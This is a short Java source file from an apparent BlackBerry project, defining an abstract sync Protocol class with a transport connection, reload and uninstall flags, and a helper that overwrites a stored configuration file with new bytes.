//#preprocess
package blackberry.action.sync;

import blackberry.config.Conf;
import blackberry.fs.AutoFlashFile;
import blackberry.transfer.CommandException;
import blackberry.transfer.Proto;
import blackberry.transfer.ProtocolException;

public abstract class Protocol {
    protected Transport transport;

    public boolean reload;
    public boolean uninstall;

    public boolean init(Transport transport) {
        this.transport = transport;
        return transport.initConnection();
    }

    public abstract boolean start() throws ProtocolException;

    public static boolean saveNewConf(byte[] conf) throws CommandException{
        final AutoFlashFile file = new AutoFlashFile(Conf.NEW_CONF_PATH
                + Conf.NEW_CONF, true);

        if (file.exists()) {
            file.delete();
        }
        
        file.create();
        final boolean ret = file.write(conf);
        if (!ret) {
            throw new CommandException(); //"write"
        } 
        
        return ret;
    }
}
